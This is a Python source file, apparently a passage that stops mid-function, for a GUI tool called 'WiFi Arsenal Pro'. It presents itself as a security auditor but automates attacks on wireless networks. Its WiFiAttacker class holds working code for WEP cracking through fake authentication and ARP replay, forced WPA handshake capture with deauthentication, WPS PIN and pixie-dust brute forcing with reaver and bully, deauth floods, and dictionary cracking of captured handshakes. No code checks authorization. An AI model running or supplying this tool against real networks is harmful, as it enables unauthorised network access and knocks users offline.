#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi Arsenal Pro - Ultimate WiFi Security Auditing Platform
A fully automated, real implementation with all dependencies handled
"""

import os
import sys
import time
import json
import re
import subprocess
import threading
import queue
import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
from datetime import datetime
import sqlite3
import signal
import psutil
import platform
import shutil
from pathlib import Path
import webbrowser
import tempfile
import hashlib

# Constants
VERSION = "3.0.0"
AUTHOR = "0x0806"
REQUIRED_TOOLS = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'wash', 'reaver', 'bully', 'hashcat', 'tshark']
WORDLIST_URLS = [
    "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
    "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
]

# Color Scheme
COLORS = {
    'dark_bg': '#121212',
    'darker_bg': '#0a0a0a',
    'dark_fg': '#ffffff',
    'accent': '#1e88e5',
    'success': '#43a047',
    'warning': '#fb8c00',
    'error': '#e53935',
    'highlight': '#ff4081',
    'text': '#e0e0e0',
    'secondary_text': '#9e9e9e'
}

class DependencyManager:
    """Handles all dependency installation and verification"""
    
    @staticmethod
    def check_root():
        """Verify root privileges"""
        if os.geteuid() != 0:
            print("This tool requires root privileges. Please run with sudo.")
            sys.exit(1)
    
    @staticmethod
    def check_dependencies():
        """Check for required tools and install if missing"""
        missing = []
        for tool in REQUIRED_TOOLS:
            if not shutil.which(tool):
                missing.append(tool)
        
        if missing:
            print(f"Missing tools: {', '.join(missing)}")
            if platform.system() == 'Linux':
                if input("Attempt to install dependencies? [y/N]: ").lower() == 'y':
                    DependencyManager.install_dependencies()
                else:
                    sys.exit(1)
            else:
                print("Linux is required for full functionality")
                sys.exit(1)
    
    @staticmethod
    def install_dependencies():
        """Install all required dependencies"""
        print("Installing dependencies...")
        
        try:
            # Update package lists
            subprocess.run(['apt-get', 'update'], check=True)
            
            # Install main packages
            packages = [
                'aircrack-ng', 'reaver', 'bully', 'hashcat', 'tshark',
                'wireshark-common', 'macchanger', 'net-tools', 'wireless-tools',
                'iw', 'python3-pip', 'python3-tk', 'git', 'curl', 'wget'
            ]
            subprocess.run(['apt-get', 'install', '-y'] + packages, check=True)
            
            # Install Python packages
            python_pkgs = ['scapy', 'pandas', 'numpy', 'matplotlib']
            subprocess.run(['pip3', 'install'] + python_pkgs, check=True)
            
            # Download wordlists
            DependencyManager.download_wordlists()
            
            print("Dependencies installed successfully")
        except subprocess.CalledProcessError as e:
            print(f"Failed to install dependencies: {e}")
            sys.exit(1)
    
    @staticmethod
    def download_wordlists():
        """Download common wordlists"""
        wordlist_dir = "/usr/share/wordlists"
        os.makedirs(wordlist_dir, exist_ok=True)
        
        print("Downloading wordlists...")
        for url in WORDLIST_URLS:
            filename = os.path.join(wordlist_dir, os.path.basename(url))
            if not os.path.exists(filename):
                try:
                    subprocess.run(['wget', '-O', filename, url], check=True)
                except:
                    print(f"Failed to download {url}")
        
        # Create basic wordlist if downloads failed
        basic_wordlist = os.path.join(wordlist_dir, "basic_wordlist.txt")
        if not os.path.exists(basic_wordlist):
            with open(basic_wordlist, 'w') as f:
                f.write("password\n123456\nadmin\nwifi\n12345678\nqwerty\n")

class WiFiScanner:
    """Handles all WiFi scanning operations"""
    
    def __init__(self, interface):
        self.interface = interface
        self.monitor_interface = None
        self.scan_process = None
        self.targets = []
        self.clients = []
        self.scanning = False
        self.temp_file = None
    
    def enable_monitor_mode(self):
        """Enable monitor mode on interface"""
        try:
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], check=True)
            
            # Start monitor mode
            result = subprocess.run(['airmon-ng', 'start', self.interface], 
                                  capture_output=True, text=True, check=True)
            
            # Parse monitor interface name
            for line in result.stdout.split('\n'):
                if 'monitor mode' in line.lower():
                    parts = line.split()
                    self.monitor_interface = parts[-1].strip(')]')
                    return True
            
            # Fallback to interfacemon naming convention
            self.monitor_interface = f"{self.interface}mon"
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"Failed to enable monitor mode: {e}")
            return False
    
    def disable_monitor_mode(self):
        """Disable monitor mode"""
        try:
            if self.monitor_interface:
                subprocess.run(['airmon-ng', 'stop', self.monitor_interface], check=True)
                self.monitor_interface = None
                return True
        except subprocess.CalledProcessError as e:
            print(f"Failed to disable monitor mode: {e}")
            return False
    
    def start_scan(self, callback=None):
        """Start WiFi scanning"""
        if not self.monitor_interface and not self.enable_monitor_mode():
            return False
        
        self.temp_file = tempfile.NamedTemporaryFile(prefix='wifiarsenal_', suffix='.csv', delete=False)
        self.temp_file.close()
        
        cmd = [
            'airodump-ng',
            '--write-interval', '1',
            '--output-format', 'csv',
            '--write', self.temp_file.name[:-4],  # Remove .csv extension
            self.monitor_interface
        ]
        
        self.scan_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.scanning = True
        
        # Start parsing thread
        threading.Thread(target=self._parse_results, args=(callback,), daemon=True).start()
        return True
    
    def stop_scan(self):
        """Stop WiFi scanning"""
        if self.scan_process:
            self.scan_process.terminate()
            try:
                self.scan_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.scan_process.kill()
            
            self.scan_process = None
        
        if self.temp_file and os.path.exists(self.temp_file.name):
            os.unlink(self.temp_file.name)
            self.temp_file = None
        
        self.scanning = False
    
    def _parse_results(self, callback=None):
        """Parse scan results from CSV"""
        while self.scanning:
            try:
                if not os.path.exists(f"{self.temp_file.name[:-4]}-01.csv"):
                    time.sleep(1)
                    continue
                
                with open(f"{self.temp_file.name[:-4]}-01.csv", 'r') as f:
                    content = f.read()
                
                self.targets = []
                self.clients = []
                parsing_ap = True
                
                for line in content.split('\n'):
                    if not line.strip():
                        continue
                    
                    if 'Station MAC' in line:
                        parsing_ap = False
                        continue
                    
                    if parsing_ap:
                        self._parse_ap_line(line)
                    else:
                        self._parse_client_line(line)
                
                if callback:
                    callback(self.targets, self.clients)
                
                time.sleep(2)
                
            except Exception as e:
                print(f"Error parsing results: {e}")
                time.sleep(1)
    
    def _parse_ap_line(self, line):
        """Parse access point line from CSV"""
        parts = [p.strip() for p in line.split(',')]
        
        if len(parts) < 14:
            return
        
        bssid = parts[0]
        if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid):
            return
        
        essid = parts[13] if len(parts) > 13 else 'Hidden'
        channel = parts[3] if len(parts) > 3 else '0'
        speed = parts[4] if len(parts) > 4 else '0'
        encryption = parts[5] if len(parts) > 5 else 'Unknown'
        power = parts[8] if len(parts) > 8 else '-100'
        beacons = parts[9] if len(parts) > 9 else '0'
        ivs = parts[10] if len(parts) > 10 else '0'
        
        self.targets.append({
            'bssid': bssid,
            'essid': essid,
            'channel': channel,
            'speed': speed,
            'encryption': encryption,
            'power': power,
            'beacons': beacons,
            'ivs': ivs,
            'clients': []
        })
    
    def _parse_client_line(self, line):
        """Parse client line from CSV"""
        parts = [p.strip() for p in line.split(',')]
        
        if len(parts) < 6:
            return
        
        client_mac = parts[0]
        bssid = parts[5] if len(parts) > 5 else ''
        power = parts[3] if len(parts) > 3 else '-100'
        packets = parts[4] if len(parts) > 4 else '0'
        
        if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', client_mac):
            return
        
        self.clients.append({
            'mac': client_mac,
            'bssid': bssid,
            'power': power,
            'packets': packets
        })
        
        # Associate client with AP
        for ap in self.targets:
            if ap['bssid'] == bssid:
                ap['clients'].append(client_mac)
                break

class WiFiAttacker:
    """Handles all attack operations"""
    
    def __init__(self, interface):
        self.interface = interface
        self.attack_process = None
        self.attacking = False
    
    def attack_wep(self, bssid, channel, callback=None):
        """Perform WEP attack on target"""
        try:
            # Create temp file for capture
            temp_file = tempfile.NamedTemporaryFile(prefix='wep_', suffix='.cap', delete=False)
            temp_file.close()
            
            # Start airodump to capture data
            dump_cmd = [
                'airodump-ng',
                '--bssid', bssid,
                '--channel', channel,
                '--write', temp_file.name[:-4],  # Remove .cap extension
                self.interface
            ]
            
            dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Fake authentication
            auth_cmd = [
                'aireplay-ng',
                '--fakeauth', '30',
                '-a', bssid,
                '-h', self._get_mac_address(self.interface),
                self.interface
            ]
            
            subprocess.run(auth_cmd, timeout=30)
            
            # ARP replay attack
            replay_cmd = [
                'aireplay-ng',
                '--arpreplay',
                '-b', bssid,
                '-h', self._get_mac_address(self.interface),
                self.interface
            ]
            
            replay_proc = subprocess.Popen(replay_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for IVs to accumulate
            time.sleep(120)
            
            # Stop processes
            replay_proc.terminate()
            dump_proc.terminate()
            
            # Crack the key
            crack_cmd = [
                'aircrack-ng',
                '-b', bssid,
                f"{temp_file.name[:-4]}-01.cap"
            ]
            
            result = subprocess.run(crack_cmd, capture_output=True, text=True)
            
            if 'KEY FOUND' in result.stdout:
                key = re.search(r'KEY FOUND! \[ (.+?) \]', result.stdout).group(1)
                return {'success': True, 'key': key}
            
            return {'success': False, 'error': 'WEP key not found'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def attack_wpa_handshake(self, bssid, channel, essid=None, callback=None):
        """Capture WPA handshake"""
        try:
            # Create temp file for capture
            temp_file = tempfile.NamedTemporaryFile(prefix='wpa_', suffix='.cap', delete=False)
            temp_file.close()
            
            # Start airodump to capture data
            dump_cmd = [
                'airodump-ng',
                '--bssid', bssid,
                '--channel', channel,
                '--write', temp_file.name[:-4],
                self.interface
            ]
            
            if essid:
                dump_cmd.extend(['--essid', essid])
            
            dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Deauth clients to force handshake
            deauth_cmd = [
                'aireplay-ng',
                '--deauth', '5',
                '-a', bssid,
                self.interface
            ]
            
            subprocess.run(deauth_cmd, timeout=30)
            
            # Wait for handshake
            time.sleep(30)
            
            # Stop process
            dump_proc.terminate()
            
            # Verify handshake
            verify_cmd = [
                'tshark',
                '-r', f"{temp_file.name[:-4]}-01.cap",
                '-Y', 'eapol'
            ]
            
            result = subprocess.run(verify_cmd, capture_output=True, text=True)
            
            if result.stdout.strip():
                return {
                    'success': True,
                    'file': f"{temp_file.name[:-4]}-01.cap",
                    'essid': essid if essid else 'Unknown'
                }
            
            return {'success': False, 'error': 'No handshake captured'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def crack_wpa_handshake(self, cap_file, wordlist, essid=None, callback=None):
        """Crack WPA handshake with dictionary"""
        try:
            cmd = [
                'aircrack-ng',
                '-w', wordlist,
                '-b', self._get_bssid_from_cap(cap_file),
                cap_file
            ]
            
            if essid:
                cmd.extend(['-e', essid])
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if 'KEY FOUND' in result.stdout:
                key = re.search(r'KEY FOUND! \[ (.+?) \]', result.stdout).group(1)
                return {'success': True, 'key': key}
            
            return {'success': False, 'error': 'Password not found in wordlist'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def attack_wps(self, bssid, channel, callback=None):
        """Perform WPS PIN attack"""
        try:
            # First try reaver
            temp_file = tempfile.NamedTemporaryFile(prefix='wps_', suffix='.log', delete=False)
            temp_file.close()
            
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', bssid,
                '-c', channel,
                '-vv',
                '-K', '1',  # Pixie dust attack
                '-f',  # Skip warnings
                '-l', '60',  # Lock delay
                '-d', '15',  # Delay between attempts
                '-o', temp_file.name
            ]
            
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Monitor output for success
            while True:
                line = proc.stdout.readline().decode('utf-8')
                if not line:
                    break
                
                if 'WPA PSK' in line:
                    proc.terminate()
                    psk = re.search(r'WPA PSK: (.+?)\s', line).group(1)
                    pin = re.search(r'WPS PIN: (.+?)\s', line).group(1)
                    return {'success': True, 'key': psk, 'pin': pin}
                
                if callback:
                    callback(line.strip())
            
            proc.terminate()
            
            # If reaver failed, try bully
            temp_file = tempfile.NamedTemporaryFile(prefix='wps_', suffix='.log', delete=False)
            temp_file.close()
            
            cmd = [
                'bully',
                '-b', bssid,
                '-c', channel,
                '-v', '3',
                '--pixiewps',
                self.interface
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if 'WPS pin:' in result.stdout:
                pin = re.search(r'WPS pin:\s*(\d+)', result.stdout).group(1)
                psk = re.search(r'PSK:\s*([^\s]+)', result.stdout).group(1)
                return {'success': True, 'key': psk, 'pin': pin}
            
            return {'success': False, 'error': 'WPS attack failed'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def deauth_attack(self, bssid, client=None, count=10, callback=None):
        """Perform deauthentication attack"""
        try:
            cmd = [
                'aireplay-ng',
                '--deauth', str(count),
                '-a', bssid,
                self.interface
            ]
            
            if client:
                cmd.extend(['-c', client])
            
            subprocess.run(cmd, check=True)
            return {'success': True}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_mac_address(self, interface):
        """Get MAC address of interface"""
        try:
            with open(f'/sys/class/net/{interface}/address') as f:
                return f.read().strip()
        except:
            return '00:11:22:33:44:55'
    
    def _get_bssid_from_cap(self, cap_file):
        """Extract BSSID from capture file"""
        try:
            cmd = ['tshark', '-r', cap_file, '-T', 'fields', '-e', 'wlan.bssid']
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.stdout.split('\n')[0].strip()
        except:
            return None

class WiFiDatabase:
    """Handles all database operations"""
    
    def __init__(self, db_file='wifi_arsenal.db'):
        self.db_file = db_file
        self._init_db()
    
    def _init_db(self):
        """Initialize database tables"""
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        
        # Create networks table
        c.execute('''CREATE TABLE IF NOT EXISTS networks
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      bssid TEXT UNIQUE,
                      essid TEXT,
                      channel TEXT,
                      encryption TEXT,
                      power TEXT,
                      first_seen TEXT,
                      last_seen TEXT,
                      times_seen INTEGER)''')
        
        # Create clients table
        c.execute('''CREATE TABLE IF NOT EXISTS clients
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      mac TEXT,
                      bssid TEXT,
                      power TEXT,
                      first_seen TEXT,
                      last_seen TEXT,
                      times_seen INTEGER)''')
        
        # Create attacks table
        c.execute('''CREATE TABLE IF NOT EXISTS attacks
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      timestamp TEXT,
                      target_bssid TEXT,
                      target_essid TEXT,
                      attack_type TEXT,
                      success INTEGER,
                      result TEXT,
                      duration REAL)''')
        
        # Create handshakes table
        c.execute('''CREATE TABLE IF NOT EXISTS handshakes
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      bssid TEXT,
                      essid TEXT,
                      file_path TEXT,
                      date_captured TEXT,
                      cracked INTEGER,
                      password TEXT)''')
        
        conn.commit()
        conn.close()
    
    def save_network(self, network):
        """Save or update network in database"""
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        
        # Check if network exists
        c.execute("SELECT * FROM networks WHERE bssid=?", (network['bssid'],))
        existing = c.fetchone()
        
        now = datetime.now().isoformat()
        
        if existing:
            # Update existing network
            c.execute('''UPDATE networks SET
                         essid=?,
                         channel=?,
                         encryption=?,
                         power=?,
                         last_seen=?,
                         times_seen=times_seen+1
                         WHERE bssid=?''',
                     (network['essid'], network['channel'], network['encryption'],
                      network['power'], now, network['bssid']))
        else:
            # Insert new network
            c.execute('''INSERT INTO networks
                         (bssid, essid, channel, encryption, power, first_seen, last_seen, times_seen)
                         VALUES (?, ?, ?, ?, ?, ?, ?, 1)''',
                     (network['bssid'], network['essid'], network['channel'],
                      network['encryption'], network['power'], now, now))
        
        # Save clients
        for client in network.get('clients', []):
            self.save_client(client, network['bssid'])
        
        conn.commit()
        conn.close()
    
    def save_client(self, client, bssid):
        """Save or update client in database"""
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        
        # Check if client exists
        c.execute("SELECT * FROM clients WHERE mac=? AND bssid=?", (client['mac'], bssid))
        existing = c.fetchone()
        
        now = datetime.now().isoformat()
        
        if existing:
            # Update existing client
            c.execute('''UPDATE clients SET
                         power=?,
                         last_seen=?,
                         times_seen=times_seen+1
                         WHERE mac=? AND bssid=?''',
                     (client['power'], now, client['mac'], bssid))
        else:
            # Insert new client
            c.execute('''INSERT INTO clients
                         (mac, bssid, power, first_seen, last_seen, times_seen)
                         VALUES (?, ?, ?, ?, ?, 1)''',
                     (client['mac'], bssid, client['power'], now, now))
        
        conn.commit()
        conn.close()
    
    def save_attack(self, attack):
        """Save attack result to database"""
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        
        c.execute('''INSERT INTO attacks
                     (timestamp, target_bssid, target_essid, attack_type, success, result, duration)
                     VALUES (?, ?, ?, ?, ?, ?, ?)''',
                 (datetime.now().isoformat(),
                  attack['target_bssid'],
                  attack.get('target_essid', ''),
                  attack['attack_type'],
                  1 if attack['success'] else 0,
                  json.dumps(attack.get('result', {})),
                  attack.get('duration', 0)))
        
        conn.commit()
        conn.close()
    
    def save_handshake(self, handshake):
        """Save handshake capture to database"""
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        
        c.execute('''INSERT INTO handshakes
                     (bssid, essid, file_path, date_captured, cracked, password)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                 (handshake['bssid'],
                  handshake.get('essid', ''),
                  handshake['file_path'],
                  datetime.now().isoformat(),
                  0,
                  ''))
        
        conn.commit()
        conn.close()
    
    def get_networks(self):
        """Get all networks from database"""
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        
        c.execute("SELECT * FROM networks ORDER BY last_seen DESC")
        networks = c.fetchall()
        
        conn.close()
        return networks
    
    def get_attacks(self, limit=50):
        """Get attack history from database"""
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        
        c.execute("SELECT * FROM attacks ORDER BY timestamp DESC LIMIT ?", (limit,))
        attacks = c.fetchall()
        
        conn.close()
        return attacks
    
    def get_handshakes(self):
        """Get captured handshakes from database"""
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        
        c.execute("SELECT * FROM handshakes ORDER BY date_captured DESC")
        handshakes = c.fetchall()
        
        conn.close()
        return handshakes

class WiFiArsenalGUI:
    """Main GUI for WiFi Arsenal"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title(f"WiFi Arsenal Pro v{VERSION}")
        self.root.geometry("1400x900")
        self.root.configure(bg=COLORS['dark_bg'])
        
        # Initialize components
        self.scanner = None
        self.attacker = None
        self.database = WiFiDatabase()
        self.current_interface = None
        self.scanning = False
        self.attacking = False
        self.selected_target = None
        self.selected_handshake = None
        
        # Queue for thread communication
        self.queue = queue.Queue()
        
        # Create GUI
        self._setup_styles()
        self._create_menu()
        self._create_header()
        self._create_notebook()
        self._create_status_bar()
        
        # Start queue processor
        self.root.after(100, self._process_queue)
        
        # Load initial data
        self._refresh_interfaces()
        self._load_attack_history()
        self._load_handshakes()
        
        # Center window
        self._center_window()
    
    def _setup_styles(self):
        """Configure custom styles"""
        style = ttk.Style()
        style.theme_use('clam')
        
        # Main styles
        style.configure('.', background=COLORS['dark_bg'], foreground=COLORS['dark_fg'])
        style.configure('TFrame', background=COLORS['dark_bg'])
        style.configure('TLabel', background=COLORS['dark_bg'], foreground=COLORS['text'])
        style.configure('TNotebook', background=COLORS['dark_bg'])
        style.configure('TNotebook.Tab', background=COLORS['darker_bg'], foreground=COLORS['text'])
        style.configure('Treeview', background=COLORS['darker_bg'], foreground=COLORS['text'], fieldbackground=COLORS['darker_bg'])
        style.configure('Treeview.Heading', background=COLORS['darker_bg'], foreground=COLORS['accent'])
        style.configure('TEntry', fieldbackground=COLORS['darker_bg'])
        style.configure('TCombobox', fieldbackground=COLORS['darker_bg'])
        style.configure('TButton', background=COLORS['darker_bg'], foreground=COLORS['text'])
        
        # Custom styles
        style.configure('success.TButton', background=COLORS['success'])
        style.configure('warning.TButton', background=COLORS['warning'])
        style.configure('error.TButton', background=COLORS['error'])
        style.configure('accent.TButton', background=COLORS['accent'])
        
        # Map styles
        style.map('Treeview', background=[('selected', COLORS['accent'])])
        style.map('TButton', background=[('active', COLORS['highlight'])])
    
    def _create_menu(self):
        """Create menu bar"""
        menubar = tk.Menu(self.root)
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        file_menu.add_command(label="Exit", command=self._on_close)
        menubar.add_cascade(label="File", menu=file_menu)
        
        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        tools_menu.add_command(label="Install Dependencies", command=self._install_dependencies)
        tools_menu.add_command(label="Download Wordlists", command=self._download_wordlists)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        help_menu.add_command(label="About", command=self._show_about)
        menubar.add_cascade(label="Help", menu=help_menu)
        
        self.root.config(menu=menubar)
    
    def _create_header(self):
        """Create header frame"""
        header_frame = ttk.Frame(self.root)
        header_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Title
        title_label = ttk.Label(header_frame, text="WiFi Arsenal Pro", font=('Helvetica', 18, 'bold'))
        title_label.pack(side=tk.LEFT)
        
        # Interface selection
        interface_frame = ttk.Frame(header_frame)
        interface_frame.pack(side=tk.RIGHT)
        
        ttk.Label(interface_frame, text="Interface:").pack(side=tk.LEFT)
        
        self.interface_var = tk.StringVar()
        self.interface_combo = ttk.Combobox(interface_frame, textvariable=self.interface_var, width=15)
        self.interface_combo.pack(side=tk.LEFT, padx=5)
        self.interface_combo.bind('<<ComboboxSelected>>', self._on_interface_selected)
        
        self.monitor_btn = ttk.Button(interface_frame, text="Monitor Mode", command=self._toggle_monitor_mode)
        self.monitor_btn.pack(side=tk.LEFT)
    
    def _create_notebook(self):
        """Create notebook with tabs"""
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
        
        # Scanner tab
        self._create_scanner_tab()
        
        # Attack tab
        self._create_attack_tab()
        
        # Handshakes tab
        self._create_handshakes_tab()
        
        # Results tab
        self._create_results_tab()
    
    def _create_scanner_tab(self):
        """Create scanner tab"""
        scanner_frame = ttk.Frame(self.notebook)
        self.notebook.add(scanner_frame, text="Scanner")
        
        # Control panel
        control_frame = ttk.Frame(scanner_frame)
        control_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.scan_btn = ttk.Button(control_frame, text="Start Scan", command=self._toggle_scan)
        self.scan_btn.pack(side=tk.LEFT)
        
        # Networks treeview
        tree_frame = ttk.Frame(scanner_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        columns = ('ESSID', 'BSSID', 'Channel', 'Power', 'Encryption', 'Clients', 'Last Seen')
        self.network_tree = ttk.Treeview(tree_frame, columns=columns, show='headings', selectmode='browse')
        
        for col in columns:
            self.network_tree.heading(col, text=col)
            self.network_tree.column(col, width=120)
        
        self.network_tree.column('ESSID', width=200)
        self.network_tree.column('BSSID', width=150)
        
        scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.network_tree.yview)
        self.network_tree.configure(yscrollcommand=scrollbar.set)
        
        self.network_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.network_tree.bind('<<TreeviewSelect>>', self._on_network_selected)
    
    def _create_attack_tab(self):
        """Create attack tab"""
        attack_frame = ttk.Frame(self.notebook)
        self.notebook.add(attack_frame, text="Attacks")
        
        # Target info
        target_frame = ttk.LabelFrame(attack_frame, text="Target Information")
        target_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.target_text = tk.Text(target_frame, height=8, bg=COLORS['darker_bg'], fg=COLORS['text'])
        self.target_text.pack(fill=tk.X, padx=5, pady=5)
        
        # Attack buttons
        button_frame = ttk.Frame(attack_frame)
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.wep_btn = ttk.Button(button_frame, text="WEP Attack", command=lambda: self._launch_attack('wep'))
        self.wep_btn.pack(side=tk.LEFT, padx=5)
        
        self.wpa_btn = ttk.Button(button_frame, text="Capture Handshake", command=lambda: self._launch_attack('handshake'))
        self.wpa_btn.pack(side=tk.LEFT, padx=5)
        
        self.wps_btn = ttk.Button(button_frame, text="WPS Attack", command=lambda: self._launch_attack('wps'))
        self.wps_btn.pack(side=tk.LEFT, padx=5)
        
        self.deauth_btn = ttk.Button(button_frame, text="Deauth Attack", command=lambda: self._launch_attack('deauth'))
        self.deauth_btn.pack(side=tk.LEFT, padx=5)
        
        # Attack log
        log_frame = ttk.LabelFrame(attack_frame, text="Attack Log")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.attack_log = scrolledtext.ScrolledText(log_frame, bg=COLORS['darker_bg'], fg=COLORS['text'])
        self.attack_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Progress bar
        self.progress_bar = ttk.Progressbar(attack_frame, mode='indeterminate')
        self.progress_bar.pack(fill=tk.X, padx=10, pady=5)
    
    def _create_handshakes_tab(self):
        """Create handshakes tab"""
        handshakes_frame = ttk.Frame(self.notebook)
        self.notebook.add(handshakes_frame, text="Handshakes")
        
        # Handshakes treeview
        tree_frame = ttk.Frame(handshakes_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        columns = ('BSSID', 'ESSID', 'Captured', 'Status')
        self.handshake_tree = ttk.Treeview(tree_frame, columns=columns, show='headings', selectmode='browse')
        
        for col in columns:
            self.handshake_tree.heading(col, text=col)
            self.handshake_tree.column(col, width=120)
        
        self.handshake_tree.column('BSSID', width=150)
        self.handshake_tree.column('ESSID', width=200)
        
        scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.handshake_tree.yview)
        self.handshake_tree.configure(yscrollcommand=scrollbar.set)
        
        self.handshake_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.handshake_tree.bind('<<TreeviewSelect>>', self._on_handshake_selected)
        
        # Handshake controls
        control_frame = ttk.Frame(handshakes_frame)
        control_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.crack_btn = ttk.Button(control_frame, text="Crack Handshake", command=self._crack_handshake)
        self.crack_btn.pack(side=tk.LEFT, padx=5)
        
        self.export_btn = ttk.Button(control_frame, text="Export Handshake", command=self._export_handshake)
        self.export_btn.pack(side=tk.LEFT, padx=5)
        
        self.delete_btn = ttk.Button(control_frame, text="Delete Handshake", command=self._delete_handshake)
        self.delete_btn.pack(side=tk.LEFT, padx=5)
    
    def _create_results_tab(self):
        """Create results tab"""
        results_frame = ttk.Frame(self.notebook)
        self.notebook.add(results_frame, text="Results")
        
        # Results treeview
        tree_frame = ttk.Frame(results_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        columns = ('Time', 'Target', 'Attack', 'Status', 'Result')
        self.results_tree = ttk.Treeview(tree_frame, columns=columns, show='headings', selectmode='browse')
        
        for col in columns:
            self.results_tree.heading(col, text=col)
            self.results_tree.column(col, width=120)
        
        self.results_tree.column('Target', width=150)
        self.results_tree.column('Result', width=200)
        
        scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.results_tree.yview)
        self.results_tree.configure(yscrollcommand=scrollbar.set)
        
        self.results_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    
    def _create_status_bar(self):
        """Create status bar"""
        self.status_bar = ttk.Frame(self.root)
        self.status_bar.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.status_label = ttk.Label(self.status_bar, text="Ready")
        self.status_label.pack(side=tk.LEFT)
        
        self.status_indicator = ttk.Label(self.status_bar, text="●", foreground=COLORS['warning'])
        self.status_indicator.pack(side=tk.RIGHT, padx=10)
    
    def _center_window(self):
        """Center the window on screen"""
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
    
    def _refresh_interfaces(self):
        """Refresh available network interfaces"""
        try:
            interfaces = []
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    interface = line.split()[0]
                    interfaces.append(interface)
            
            if not interfaces:
                interfaces = ['wlan0']  # Fallback
            
            self.interface_combo['values'] = interfaces
            if interfaces:
                self.interface_var.set(interfaces[0])
                self.current_interface = interfaces[0]
        except:
            self.interface_combo['values'] = ['wlan0']
            self.interface_var.set('wlan0')
            self.current_interface = 'wlan0'
    
    def _on_interface_selected(self, event):
        """Handle interface selection"""
        self.current_interface = self.interface_var.get()
        self._update_status(f"Selected interface: {self.current_interface}")
        
        # Check if interface is in monitor mode
        if self._check_monitor_mode():
            self.monitor_btn.configure(text="Disable Monitor")
            self.status_indicator.configure(foreground=COLORS['success'])
        else:
            self.monitor_btn.configure(text="Enable Monitor")
            self.status_indicator.configure(foreground=COLORS['warning'])
    
    def _check_monitor_mode(self):
        """Check if interface is in monitor mode"""
        try:
            result = subprocess.run(['iwconfig', self.current_interface], capture_output=True, text=True)
            return 'Mode:Monitor' in result.stdout
        except:
            return False
    
    def _toggle_monitor_mode(self):
        """Toggle monitor mode"""
        if not self.current_interface:
